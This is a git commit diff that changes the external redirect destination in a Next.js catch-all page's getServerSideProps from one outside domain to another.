6efa64ce7903f8f7807e91314e96a91d4f2146f0
natureglow <150833839+natureglow@users.noreply.github.com>
2023-11-14 22:11:48 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`http://natureglow.kesug.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
